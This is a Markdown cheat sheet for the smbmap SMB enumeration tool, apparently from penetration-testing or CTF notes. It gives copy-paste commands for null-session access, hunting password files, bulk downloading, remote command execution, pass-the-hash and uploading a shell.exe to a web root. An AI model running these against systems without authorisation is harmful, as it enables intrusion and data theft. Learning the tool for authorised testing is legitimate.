# smbmap — SMB share permissions mapper

> **The fastest way to see "what can I read/write?"** Shows READ/WRITE/NO ACCESS per share in one line per share. Essential after finding creds.

**Install check (Parrot — already installed):** `smbmap -h`

---

## 🎯 Cheat-flow: "What do I run?"

| You need to... | Run this | Why |
|---|---|---|
| **See share perms** (creds) | `smbmap -H <IP> -u user -p pass` | R/W per share |
| Null session | `smbmap -H <IP> -u '' -p ''` | Anonymous |
| Guest | `smbmap -H <IP> -u guest -p ''` | Guest account |
| **Recursive file listing** | `smbmap -H <IP> -u user -p pass -R` | Walk all shares |
| Recurse one share | `smbmap -H <IP> -u u -p p -R share` | Walk one |
| Find files by pattern | `smbmap -H <IP> -u u -p p -R --search '.*\.txt'` | Regex search |
| Download a file | `smbmap -H <IP> -u u -p p --download 'share\path\file'` | Pull single |
| Upload a file | `smbmap -H <IP> -u u -p p --upload local remote` | Write test |
| Run a command | `smbmap -H <IP> -u u -p p -x 'whoami'` | Exec via SMB |
| Pass-the-hash | `smbmap -H <IP> -u Admin -p LM:NT` | PtH |
| Whole subnet | `smbmap --host-file ips.txt -u u -p p` | Sweep |

---

## 🔑 Flags you must know cold

| Flag | Meaning |
|---|---|
| `-H <IP>` | **Target host** |
| `--host-file <file>` | List of hosts |
| `-u <user>` | Username |
| `-p <pass>` | Password (or `LM:NT` hash) |
| `-d <domain>` | Domain (default WORKGROUP) |
| `-s <share>` | Target specific share |
| `-R [share]` | **Recursive** directory listing |
| `-r [path]` | Non-recursive list |
| `--depth N` | Recursion depth (default 5) |
| `-A <pattern>` | Auto-download matching files |
| `--search <regex>` | Search filenames by regex |
| `--download '<share>\<path>'` | Download file |
| `--upload <local> <remote>` | Upload file |
| `-x '<cmd>'` | Execute command (needs admin) |
| `-q` | Quiet (no banner) |

---

## 📋 Command recipes (copy-paste)

```bash
# 1. Null-session share perms
smbmap -H <IP> -u '' -p ''

# 2. Authenticated perms (most common)
smbmap -H <IP> -u 'admin' -p 'Password123'

# 3. Recursive file walk to find interesting stuff
smbmap -H <IP> -u 'user' -p 'pass' -R --depth 10 | tee smbmap-R.txt

# 4. Search for passwords in filenames
smbmap -H <IP> -u 'u' -p 'p' -R --search 'pass.*\.(txt|xml|ini|config)'

# 5. Auto-download every .txt
smbmap -H <IP> -u 'u' -p 'p' -R -A '.*\.txt'

# 6. Pull a specific file
smbmap -H <IP> -u 'u' -p 'p' --download 'Users\admin\Desktop\flag.txt'

# 7. Upload a file to a writable share
smbmap -H <IP> -u 'u' -p 'p' --upload ./shell.exe 'wwwroot\shell.exe'

# 8. Pass-the-hash
smbmap -H <IP> -u Administrator \
  -p 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# 9. Sweep a subnet
for i in $(seq 1 254); do echo 10.10.10.$i; done > hosts.txt
smbmap --host-file hosts.txt -u 'user' -p 'pass'
```

---

## ⚠️ Gotchas

- **Perm legend:** `READ ONLY`, `READ, WRITE`, `NO ACCESS`. Pay attention — READ on `C$` is game over.
- **Null session on modern Windows** → expect NO ACCESS. Get creds first.
- **`-R` without a share name** walks every readable share — slow but thorough.
- **Exec (`-x`)** uses PSExec-style semantics — needs admin-level creds + `ADMIN$` write.
- **Hash format** is `LM:NT` (use `aad3b435b51404eeaad3b435b51404ee` for empty LM).
- **Wrong domain** can silently fail — specify `-d` if known.
- **Backslashes in path** need quoting in bash: `--download 'share\file.txt'`.

---

## 🔗 Related

- [smbclient](./smbclient.md) — interactive file ops
- [enum4linux](./enum4linux.md) — broader SMB enum
- [crackmapexec](./crackmapexec.md) — bulk spray + exec
- [impacket](./impacket.md) — `psexec.py`, `smbexec.py`
- [nmap](./nmap.md) — `smb-enum-shares`
